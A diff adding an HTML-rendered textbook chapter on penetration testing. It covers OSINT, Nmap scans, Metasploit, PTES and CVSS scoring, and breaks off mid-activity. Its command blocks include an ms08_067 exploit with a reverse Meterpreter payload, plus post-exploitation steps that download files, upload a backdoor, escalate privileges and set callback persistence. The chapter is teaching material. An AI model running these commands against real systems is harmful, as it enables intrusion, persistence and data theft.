@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>chapter09-penetration-testing.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="chapter-9-asset-security--penetration-testing">Chapter 9: Asset Security &amp; Penetration Testing</h1>
+<h2 id="learning-objectives">Learning Objectives</h2>
+<p>By the end of this chapter, you will be able to:</p>
+<ul>
+<li>Understand the fundamentals of asset security and penetration testing</li>
+<li>Follow the complete penetration testing lifecycle from planning to reporting</li>
+<li>Use Nmap for network scanning and reconnaissance</li>
+<li>Conduct OSINT (Open Source Intelligence) gathering</li>
+<li>Utilize Metasploit for exploitation and post-exploitation</li>
+<li>Perform web and wireless exploitation techniques</li>
+<li>Apply PTES (Penetration Testing Execution Standard) methodology</li>
+<li>Use CVSS scoring for vulnerability assessment</li>
+<li>Create professional penetration testing reports</li>
+</ul>
+<h2 id="introduction">Introduction</h2>
+<p>Asset security and penetration testing represent the offensive side of cybersecurity - testing your defenses through ethical hacking to identify vulnerabilities before malicious actors can exploit them. This chapter covers the complete penetration testing methodology, from initial planning to final reporting, providing hands-on experience with industry-standard tools and frameworks.</p>
+<h2 id="what-is-asset-security">What is Asset Security?</h2>
+<p>Asset security involves protecting an organization's valuable information and systems from unauthorized access, use, disclosure, disruption, modification, or destruction. Penetration testing is a proactive approach to asset security that simulates real-world attacks to identify and remediate vulnerabilities.</p>
+<h3 id="key-concepts">Key Concepts</h3>
+<ul>
+<li><strong>Asset</strong>: Any data, device, or system that has value to an organization</li>
+<li><strong>Vulnerability</strong>: A weakness that could be exploited by a threat</li>
+<li><strong>Threat</strong>: Any circumstance or event that could harm an asset</li>
+<li><strong>Risk</strong>: The likelihood that a threat will exploit a vulnerability</li>
+<li><strong>Penetration Testing</strong>: Authorized simulated attacks to test security controls</li>
+</ul>
+<pre><code class="language-mermaid"><div class="mermaid">graph TD
+    A[Asset Identification] --> B[Vulnerability Assessment]
+    B --> C[Threat Analysis]
+    C --> D[Risk Evaluation]
+    D --> E[Security Controls]
+    E --> F[Penetration Testing]
+    F --> G[Remediation]
+    G --> H[Continuous Monitoring]
+    
+    style A fill:#e1f5fe
+    style F fill:#ffebee
+    style G fill:#e8f5e8
+</div></code></pre>
+<h2 id="penetration-testing-methodology">Penetration Testing Methodology</h2>
+<h3 id="the-penetration-testing-lifecycle">The Penetration Testing Lifecycle</h3>
+<p>Penetration testing follows a structured approach to ensure comprehensive coverage and ethical conduct:</p>
+<pre><code class="language-mermaid"><div class="mermaid">graph LR
+    A[Planning & Preparation] --> B[Reconnaissance]
+    B --> C[Scanning & Enumeration]
+    C --> D[Gaining Access]
+    D --> E[Maintaining Access]
+    E --> F[Analysis & Reporting]
+    
+    style A fill:#e3f2fd
+    style B fill:#f3e5f5
+    style C fill:#e8f5e8
+    style D fill:#fff3e0
+    style E fill:#fce4ec
+    style F fill:#f1f8e9
+</div></code></pre>
+<h4 id="1-planning--preparation">1. Planning &amp; Preparation</h4>
+<ul>
+<li>Define scope and objectives</li>
+<li>Obtain proper authorization</li>
+<li>Establish rules of engagement</li>
+<li>Set up testing environment</li>
+<li>Prepare tools and resources</li>
+</ul>
+<h4 id="2-reconnaissance-osint">2. Reconnaissance (OSINT)</h4>
+<ul>
+<li>Passive information gathering</li>
+<li>Active information gathering</li>
+<li>Social engineering reconnaissance</li>
+<li>Technical reconnaissance</li>
+</ul>
+<h4 id="3-scanning--enumeration">3. Scanning &amp; Enumeration</h4>
+<ul>
+<li>Network scanning</li>
+<li>Port scanning</li>
+<li>Service enumeration</li>
+<li>Vulnerability scanning</li>
+</ul>
+<h4 id="4-gaining-access">4. Gaining Access</h4>
+<ul>
+<li>Exploitation of vulnerabilities</li>
+<li>Privilege escalation</li>
+<li>Web application attacks</li>
+<li>Wireless network attacks</li>
+</ul>
+<h4 id="5-maintaining-access">5. Maintaining Access</h4>
+<ul>
+<li>Backdoor installation</li>
+<li>Persistence mechanisms</li>
+<li>Data exfiltration</li>
+<li>Lateral movement</li>
+</ul>
+<h4 id="6-analysis--reporting">6. Analysis &amp; Reporting</h4>
+<ul>
+<li>Evidence collection</li>
+<li>Vulnerability documentation</li>
+<li>Risk assessment</li>
+<li>Remediation recommendations</li>
+</ul>
+<h2 id="osint-open-source-intelligence">OSINT (Open Source Intelligence)</h2>
+<p>OSINT is the collection and analysis of publicly available information to gather intelligence about a target organization or individual.</p>
+<h3 id="osint-process">OSINT Process</h3>
+<pre><code class="language-mermaid"><div class="mermaid">graph TD
+    A[Target Identification] --> B[Information Sources]
+    B --> C[Data Collection]
+    C --> D[Data Analysis]
+    D --> E[Intelligence Production]
+    E --> F[Actionable Insights]
+    
+    style A fill:#e8f5e8
+    style C fill:#fff3e0
+    style E fill:#e1f5fe
+</div></code></pre>
+<h3 id="osint-sources">OSINT Sources</h3>
+<h4 id="public-sources">Public Sources</h4>
+<ul>
+<li><strong>Company Websites</strong>: Corporate information, employee details, technology stack</li>
+<li><strong>Social Media</strong>: LinkedIn, Twitter, Facebook for employee information</li>
+<li><strong>Job Postings</strong>: Technology stack, infrastructure details</li>
+<li><strong>Public Records</strong>: Business registrations, patents, legal documents</li>
+<li><strong>News Articles</strong>: Company developments, partnerships, acquisitions</li>
+</ul>
+<h4 id="technical-sources">Technical Sources</h4>
+<ul>
+<li><strong>DNS Records</strong>: Domain information, subdomains, mail servers</li>
+<li><strong>WHOIS Data</strong>: Domain ownership, contact information</li>
+<li><strong>Search Engines</strong>: Google dorks, specialized search operators</li>
+<li><strong>GitHub</strong>: Code repositories, configuration files</li>
+<li><strong>Shodan</strong>: Internet-connected devices and services</li>
+</ul>
+<h3 id="osint-tools">OSINT Tools</h3>
+<pre class="hljs"><code><div><span class="hljs-comment"># DNS enumeration</span>
+nslookup target.com
+dig target.com ANY
+whois target.com
+
+<span class="hljs-comment"># Subdomain discovery</span>
+gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
+
+<span class="hljs-comment"># Google dorks</span>
+site:target.com filetype:pdf
+site:target.com <span class="hljs-string">"password"</span>
+site:target.com <span class="hljs-string">"admin"</span>
+</div></code></pre>
+<h2 id="network-scanning-with-nmap">Network Scanning with Nmap</h2>
+<p>Nmap (Network Mapper) is a powerful network discovery and security auditing tool that provides comprehensive network scanning capabilities.</p>
+<h3 id="nmap-scan-types">Nmap Scan Types</h3>
+<pre><code class="language-mermaid"><div class="mermaid">graph LR
+    A[Nmap] --> B[TCP Connect Scan]
+    A --> C[SYN Scan]
+    A --> D[UDP Scan]
+    A --> E[Version Detection]
+    A --> F[OS Detection]
+    A --> G[Script Scanning]
+    
+    style A fill:#ffebee
+    style B fill:#e8f5e8
+    style C fill:#fff3e0
+    style D fill:#f3e5f5
+</div></code></pre>
+<h4 id="1-tcp-connect-scan--st">1. TCP Connect Scan (-sT)</h4>
+<ul>
+<li>Completes the TCP three-way handshake</li>
+<li>More reliable but easily detected</li>
+<li>Requires full TCP connection</li>
+</ul>
+<pre class="hljs"><code><div>nmap -sT -p 80,443,22,21 target.com
+</div></code></pre>
+<h4 id="2-syn-scan--ss">2. SYN Scan (-sS)</h4>
+<ul>
+<li>Stealthy scan that doesn't complete connections</li>
+<li>Faster and less detectable</li>
+<li>Requires root/administrator privileges</li>
+</ul>
+<pre class="hljs"><code><div>sudo nmap -sS -p 1-1000 target.com
+</div></code></pre>
+<h4 id="3-udp-scan--su">3. UDP Scan (-sU)</h4>
+<ul>
+<li>Scans UDP ports for open services</li>
+<li>Slower than TCP scans</li>
+<li>Useful for discovering DNS, DHCP, SNMP services</li>
+</ul>
+<pre class="hljs"><code><div>nmap -sU -p 53,67,161 target.com
+</div></code></pre>
+<h4 id="4-version-detection--sv">4. Version Detection (-sV)</h4>
+<ul>
+<li>Identifies service versions and details</li>
+<li>Helps identify vulnerable software versions</li>
+<li>Useful for vulnerability assessment</li>
+</ul>
+<pre class="hljs"><code><div>nmap -sV -p 80,443,22 target.com
+</div></code></pre>
+<h4 id="5-os-detection--o">5. OS Detection (-O)</h4>
+<ul>
+<li>Attempts to identify target operating system</li>
+<li>Requires root/administrator privileges</li>
+<li>Uses TCP/IP stack fingerprinting</li>
+</ul>
+<pre class="hljs"><code><div>sudo nmap -O target.com
+</div></code></pre>
+<h3 id="advanced-nmap-techniques">Advanced Nmap Techniques</h3>
+<h4 id="port-range-specification">Port Range Specification</h4>
+<pre class="hljs"><code><div><span class="hljs-comment"># Scan specific ports</span>
+nmap -p 22,80,443 target.com
+
+<span class="hljs-comment"># Scan port ranges</span>
+nmap -p 1-1000 target.com
+
+<span class="hljs-comment"># Scan all ports</span>
+nmap -p- target.com
+</div></code></pre>
+<h4 id="timing-and-performance">Timing and Performance</h4>
+<pre class="hljs"><code><div><span class="hljs-comment"># Aggressive timing</span>
+nmap -T4 target.com
+
+<span class="hljs-comment"># Paranoid timing (very slow, very stealthy)</span>
+nmap -T0 target.com
+
+<span class="hljs-comment"># Custom timing</span>
+nmap --max-retries 1 --max-scan-delay 10ms target.com
+</div></code></pre>
+<h4 id="output-formats">Output Formats</h4>
+<pre class="hljs"><code><div><span class="hljs-comment"># Normal output</span>
+nmap target.com
+
+<span class="hljs-comment"># XML output</span>
+nmap -oX scan_results.xml target.com
+
+<span class="hljs-comment"># Grepable output</span>
+nmap -oG scan_results.gnmap target.com
+
+<span class="hljs-comment"># All formats</span>
+nmap -oA scan_results target.com
+</div></code></pre>
+<h2 id="metasploit-framework">Metasploit Framework</h2>
+<p>Metasploit is a powerful penetration testing platform that provides tools for developing, testing, and executing exploit code against target systems.</p>
+<h3 id="metasploit-architecture">Metasploit Architecture</h3>
+<pre><code class="language-mermaid"><div class="mermaid">graph TD
+    A[Metasploit Framework] --> B[Modules]
+    B --> C[Exploits]
+    B --> D[Payloads]
+    B --> E[Auxiliary]
+    B --> F[Post]
+    B --> G[Encoders]
+    
+    C --> H[Remote Exploits]
+    C --> I[Local Exploits]
+    C --> J[Client-Side Exploits]
+    
+    D --> K[Single Payloads]
+    D --> L[Staged Payloads]
+    D --> M[Meterpreter]
+    
+    style A fill:#ffebee
+    style B fill:#e8f5e8
+    style C fill:#fff3e0
+    style D fill:#f3e5f5
+</div></code></pre>
+<h3 id="metasploit-components">Metasploit Components</h3>
+<h4 id="1-exploits">1. Exploits</h4>
+<ul>
+<li><strong>Remote Exploits</strong>: Target services over the network</li>
+<li><strong>Local Exploits</strong>: Require local access to the target</li>
+<li><strong>Client-Side Exploits</strong>: Target client applications</li>
+</ul>
+<h4 id="2-payloads">2. Payloads</h4>
+<ul>
+<li><strong>Single Payloads</strong>: Complete, self-contained code</li>
+<li><strong>Staged Payloads</strong>: Download and execute in stages</li>
+<li><strong>Meterpreter</strong>: Advanced, feature-rich payload</li>
+</ul>
+<h4 id="3-auxiliary-modules">3. Auxiliary Modules</h4>
+<ul>
+<li><strong>Scanners</strong>: Port scanning, service detection</li>
+<li><strong>Fuzzers</strong>: Input validation testing</li>
+<li><strong>Gatherers</strong>: Information collection</li>
+</ul>
+<h3 id="basic-metasploit-usage">Basic Metasploit Usage</h3>
+<h4 id="starting-metasploit">Starting Metasploit</h4>
+<pre class="hljs"><code><div><span class="hljs-comment"># Start Metasploit console</span>
+msfconsole
+
+<span class="hljs-comment"># Start with database</span>
+msfdb init
+msfconsole
+</div></code></pre>
+<h4 id="searching-for-modules">Searching for Modules</h4>
+<pre class="hljs"><code><div><span class="hljs-comment"># Search for exploits</span>
+search exploit windows smb
+
+<span class="hljs-comment"># Search for auxiliary modules</span>
+search auxiliary scanner
+
+<span class="hljs-comment"># Search by platform</span>
+search platform:windows
+</div></code></pre>
+<h4 id="using-exploits">Using Exploits</h4>
+<pre class="hljs"><code><div><span class="hljs-comment"># Select an exploit</span>
+use exploit/windows/smb/ms08_067_netapi
+
+<span class="hljs-comment"># Show options</span>
+show options
+
+<span class="hljs-comment"># Set required options</span>
+<span class="hljs-built_in">set</span> RHOSTS 192.168.1.100
+<span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp
+<span class="hljs-built_in">set</span> LHOST 192.168.1.10
+
+<span class="hljs-comment"># Execute exploit</span>
+exploit
+</div></code></pre>
+<h4 id="post-exploitation-with-meterpreter">Post-Exploitation with Meterpreter</h4>
+<pre class="hljs"><code><div><span class="hljs-comment"># System information</span>
+sysinfo
+
+<span class="hljs-comment"># Process list</span>
+ps
+
+<span class="hljs-comment"># File operations</span>
+ls
+<span class="hljs-built_in">cd</span> C:\\
+download secret.txt
+upload backdoor.exe
+
+<span class="hljs-comment"># Privilege escalation</span>
+getsystem
+
+<span class="hljs-comment"># Persistence</span>
+run persistence -X -i 30 -p 4444 -r 192.168.1.10
+</div></code></pre>
+<h2 id="web-and-wireless-exploitation">Web and Wireless Exploitation</h2>
+<h3 id="web-application-exploitation">Web Application Exploitation</h3>
+<p>Web applications present numerous attack vectors that penetration testers must understand and test:</p>
+<pre><code class="language-mermaid"><div class="mermaid">graph TD
+    A[Web Application] --> B[Input Validation]
+    A --> C[Authentication]
+    A --> D[Session Management]
+    A --> E[Access Control]
+    A --> F[Data Storage]
+    
+    B --> G[SQL Injection]
+    B --> H[XSS]
+    B --> I[CSRF]
+    
+    C --> J[Weak Passwords]
+    C --> K[Brute Force]
+    C --> L[Session Hijacking]
+    
+    style A fill:#e8f5e8
+    style G fill:#ffebee
+    style H fill:#fff3e0
+    style I fill:#f3e5f5
+</div></code></pre>
+<h4 id="common-web-vulnerabilities">Common Web Vulnerabilities</h4>
+<ol>
+<li>
+<p><strong>SQL Injection</strong></p>
+<ul>
+<li>Unauthorized database access</li>
+<li>Data extraction and manipulation</li>
+<li>Authentication bypass</li>
+</ul>
+</li>
+<li>
+<p><strong>Cross-Site Scripting (XSS)</strong></p>
+<ul>
+<li>Client-side code execution</li>
+<li>Session hijacking</li>
+<li>Malicious redirects</li>
+</ul>
+</li>
+<li>
+<p><strong>Cross-Site Request Forgery (CSRF)</strong></p>
+<ul>
+<li>Unauthorized actions on behalf of users</li>
+<li>Account takeover</li>
+<li>Data manipulation</li>
+</ul>
+</li>
+</ol>
+<h3 id="wireless-network-exploitation">Wireless Network Exploitation</h3>
+<p>Wireless networks introduce additional attack vectors:</p>
+<pre><code class="language-mermaid"><div class="mermaid">graph LR
+    A[Wireless Network] --> B[WEP]
+    A --> C[WPA/WPA2]
+    A --> D[WPA3]
+    A --> E[Enterprise]
+    
+    B --> F[Weak Encryption]
+    C --> G[Dictionary Attacks]
+    D --> H[Modern Security]
+    E --> I[Certificate Attacks]
+    
+    style A fill:#e8f5e8
+    style F fill:#ffebee
+    style G fill:#fff3e0
+</div></code></pre>
+<h4 id="wireless-attack-types">Wireless Attack Types</h4>
+<ol>
+<li>
+<p><strong>WEP Attacks</strong></p>
+<ul>
+<li>Weak encryption algorithm</li>
+<li>IV reuse vulnerabilities</li>
+<li>Statistical attacks</li>
+</ul>
+</li>
+<li>
+<p><strong>WPA/WPA2 Attacks</strong></p>
+<ul>
+<li>Dictionary attacks on pre-shared keys</li>
+<li>WPS PIN attacks</li>
+<li>Deauthentication attacks</li>
+</ul>
+</li>
+<li>
+<p><strong>Enterprise Attacks</strong></p>
+<ul>
+<li>Certificate-based attacks</li>
+<li>RADIUS vulnerabilities</li>
+<li>Man-in-the-middle attacks</li>
+</ul>
+</li>
+</ol>
+<h2 id="ptes-penetration-testing-execution-standard">PTES (Penetration Testing Execution Standard)</h2>
+<p>PTES provides a comprehensive methodology for conducting penetration tests:</p>
+<h3 id="ptes-phases">PTES Phases</h3>
+<pre><code class="language-mermaid"><div class="mermaid">graph TD
+    A[Pre-engagement] --> B[Intelligence Gathering]
+    B --> C[Threat Modeling]
+    C --> D[Vulnerability Analysis]
+    D --> E[Exploitation]
+    E --> F[Post Exploitation]
+    F --> G[Reporting]
+    
+    style A fill:#e3f2fd
+    style B fill:#f3e5f5
+    style C fill:#e8f5e8
+    style D fill:#fff3e0
+    style E fill:#fce4ec
+    style F fill:#f1f8e9
+    style G fill:#e8f5e8
+</div></code></pre>
+<h4 id="1-pre-engagement">1. Pre-engagement</h4>
+<ul>
+<li>Define scope and objectives</li>
+<li>Establish rules of engagement</li>
+<li>Obtain proper authorization</li>
+<li>Set up communication channels</li>
+</ul>
+<h4 id="2-intelligence-gathering">2. Intelligence Gathering</h4>
+<ul>
+<li>Passive reconnaissance</li>
+<li>Active reconnaissance</li>
+<li>Social engineering</li>
+<li>Technical reconnaissance</li>
+</ul>
+<h4 id="3-threat-modeling">3. Threat Modeling</h4>
+<ul>
+<li>Identify potential threats</li>
+<li>Assess threat capabilities</li>
+<li>Determine attack vectors</li>
+<li>Prioritize threats</li>
+</ul>
+<h4 id="4-vulnerability-analysis">4. Vulnerability Analysis</h4>
+<ul>
+<li>Automated scanning</li>
+<li>Manual testing</li>
+<li>Configuration review</li>
+<li>Code review</li>
+</ul>
+<h4 id="5-exploitation">5. Exploitation</h4>
+<ul>
+<li>Vulnerability exploitation</li>
+<li>Privilege escalation</li>
+<li>Lateral movement</li>
+<li>Data access</li>
+</ul>
+<h4 id="6-post-exploitation">6. Post Exploitation</h4>
+<ul>
+<li>Persistence establishment</li>
+<li>Data exfiltration</li>
+<li>Evidence collection</li>
+<li>Cleanup</li>
+</ul>
+<h4 id="7-reporting">7. Reporting</h4>
+<ul>
+<li>Executive summary</li>
+<li>Technical details</li>
+<li>Risk assessment</li>
+<li>Remediation recommendations</li>
+</ul>
+<h2 id="cvss-scoring">CVSS Scoring</h2>
+<p>The Common Vulnerability Scoring System (CVSS) provides a standardized method for rating the severity of security vulnerabilities.</p>
+<h3 id="cvss-components">CVSS Components</h3>
+<pre><code class="language-mermaid"><div class="mermaid">graph TD
+    A[CVSS Score] --> B[Base Score]
+    A --> C[Temporal Score]
+    A --> D[Environmental Score]
+    
+    B --> E[Attack Vector]
+    B --> F[Attack Complexity]
+    B --> G[Privileges Required]
+    B --> H[User Interaction]
+    B --> I[Scope]
+    B --> J[Confidentiality]
+    B --> K[Integrity]
+    B --> L[Availability]
+    
+    style A fill:#ffebee
+    style B fill:#e8f5e8
+    style C fill:#fff3e0
+    style D fill:#f3e5f5
+</div></code></pre>
+<h3 id="cvss-base-score-calculation">CVSS Base Score Calculation</h3>
+<h4 id="attack-vector-av">Attack Vector (AV)</h4>
+<ul>
+<li><strong>Network (N)</strong>: 0.85</li>
+<li><strong>Adjacent (A)</strong>: 0.62</li>
+<li><strong>Local (L)</strong>: 0.55</li>
+<li><strong>Physical (P)</strong>: 0.2</li>
+</ul>
+<h4 id="attack-complexity-ac">Attack Complexity (AC)</h4>
+<ul>
+<li><strong>Low (L)</strong>: 0.77</li>
+<li><strong>High (H)</strong>: 0.44</li>
+</ul>
+<h4 id="privileges-required-pr">Privileges Required (PR)</h4>
+<ul>
+<li><strong>None (N)</strong>: 0.85</li>
+<li><strong>Low (L)</strong>: 0.62</li>
+<li><strong>High (H)</strong>: 0.27</li>
+</ul>
+<h4 id="user-interaction-ui">User Interaction (UI)</h4>
+<ul>
+<li><strong>None (N)</strong>: 0.85</li>
+<li><strong>Required (R)</strong>: 0.62</li>
+</ul>
+<h4 id="scope-s">Scope (S)</h4>
+<ul>
+<li><strong>Unchanged (U)</strong>: 6.42</li>
+<li><strong>Changed (C)</strong>: 7.52</li>
+</ul>
+<h4 id="impact-metrics">Impact Metrics</h4>
+<ul>
+<li><strong>Confidentiality (C)</strong>: None (0), Low (0.22), High (0.56)</li>
+<li><strong>Integrity (I)</strong>: None (0), Low (0.22), High (0.56)</li>
+<li><strong>Availability (A)</strong>: None (0), Low (0.22), High (0.56)</li>
+</ul>
+<h3 id="cvss-score-ranges">CVSS Score Ranges</h3>
+<ul>
+<li><strong>0.1 - 3.9</strong>: Low</li>
+<li><strong>4.0 - 6.9</strong>: Medium</li>
+<li><strong>7.0 - 8.9</strong>: High</li>
+<li><strong>9.0 - 10.0</strong>: Critical</li>
+</ul>
+<h3 id="example-cvss-calculation">Example CVSS Calculation</h3>
+<pre class="hljs"><code><div><span class="hljs-comment"># Example: SQL Injection vulnerability</span>
+<span class="hljs-comment"># AV: Network (0.85)</span>
+<span class="hljs-comment"># AC: Low (0.77)</span>
+<span class="hljs-comment"># PR: None (0.85)</span>
+<span class="hljs-comment"># UI: None (0.85)</span>
+<span class="hljs-comment"># S: Unchanged (6.42)</span>
+<span class="hljs-comment"># C: High (0.56)</span>
+<span class="hljs-comment"># I: High (0.56)</span>
+<span class="hljs-comment"># A: High (0.56)</span>
+
+<span class="hljs-comment"># Base Score = 9.8 (Critical)</span>
+</div></code></pre>
+<h2 id="hands-on-activities">Hands-On Activities</h2>
+<h3 id="activity-1-osint-reconnaissance">Activity 1: OSINT Reconnaissance</h3>
+<p><strong>Objective</strong>: Conduct comprehensive OSINT gathering on a target organization</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Identify target organization</li>
+<li>Gather domain information using WHOIS and DNS tools</li>
+<li>Discover subdomains using various techniques</li>
+<li>Search for publicly available information</li>
+<li>Document findings in a structured format</li>
+</ol>
+<p><strong>Tools</strong>:</p>
+<ul>
+<li><code>whois</code>, <code>dig</code>, <code>nslookup</code></li>
+<li><code>gobuster</code>, <code>subfinder</code></li>
+<li>Google dorks</li>
+<li>Social media platforms</li>
+</ul>
+<h3 id="activity-2-network-scanning-with-nmap">Activity 2: Network Scanning with Nmap</h3>
+<p><strong>Objective</strong>: Perform comprehensive network reconnaissance using Nmap</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Set up target environment (virtual machines)</li>
+<li>Perform different types of Nmap scans</li>
+<li>Analyze scan results</li>
+<li>Identify open services and potential vulnerabilities</li>
+<li>Document findings and recommendations</li>
+</ol>
+<p><strong>Scans to Perform</strong>:</p>
+<ul>
+<li>TCP connect scan</li>
+<li>SYN scan</li>
+<li>UDP scan</li>
+<li>Version detection</li>
+<li>OS detection</li>
+</ul>
+<h3 id="activity-3-metasploit-exploitation">Activity 3: Metasploit Exploitation</h3>
+<p><strong>Objective</strong>: Use Metasploit to exploit vulnerabilities and gain access</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Set up vulnerable target system</li>
+<li>Identify target vulnerabilities</li>
+<li>Select appropriate Metasploit modules</li>
+<li>Configure and execute exploits</li>
